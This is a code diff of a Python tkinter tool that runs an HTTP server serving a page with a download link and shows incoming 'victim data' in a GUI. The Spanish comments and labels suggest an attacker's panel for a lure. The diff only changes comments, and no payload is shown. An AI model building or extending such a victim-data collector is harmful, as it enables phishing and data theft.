@@ -82,7 +82,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         </body>
                         </html>"""
         self.wfile.write(response.encode('utf-8'))
-        #messagebox.showinfo("Datos victima: ", victim_data)
         #se ejecuta en otro hilo aparte para no detener la solicitud http post a la pagina con el link de descarga
         threading.Thread(target=lambda: messagebox.showinfo("Datos víctima", victim_data),daemon=True).start()
 
@@ -91,7 +90,7 @@ def actualizar_consola_http_server(server_entry):
     server_entry.insert(tk.END, f"Datos de la victima: {victim_data}\n")
 
 def start_http_server_en_hilo(server_entry):
-    """Inicia el servidor HTTP en un hilo separado."""
+    #Inicia el servidor HTTP en un hilo separado.
     global httpd, hilo
 
     def start_http_server():
@@ -104,7 +103,6 @@ def start_http_server_en_hilo(server_entry):
         server_entry.insert(tk.END, f"Iniciando servidor HTTP en el puerto {9000}, sirviendo {DIRECTORY}...\n")
         
         handler = CustomHTTPRequestHandler
-        #httpd = socketserver.TCPServer(("", 9000), handler)
 
         httpd = HTTPServer(('0.0.0.0', 9000), handler)
 
@@ -112,7 +110,7 @@ def start_http_server_en_hilo(server_entry):
 
         server_entry.insert(tk.END, f"Servidor corriendo en http://{local_ipv4}:{9000}.\n")
 
-        httpd.timeout = 1  # Configura un tiempo de espera para las conexiones
+        httpd.timeout = 1  # Configura un tiempo de espera de 1 seg para las conexiones
         httpd.serve_forever()
 
 
@@ -127,7 +125,7 @@ def stop_http_server(server_entry):
         try:
             httpd.socket.shutdown(socket.SHUT_RDWR)
         except OSError:
-            pass  #El socket ya podría estar cerrado
+            pass  #Por si el socket ya está cerrado, no hace nada
         httpd.server_close()
         httpd = None
         server_entry.insert(tk.END, "Servidor detenido.\n")
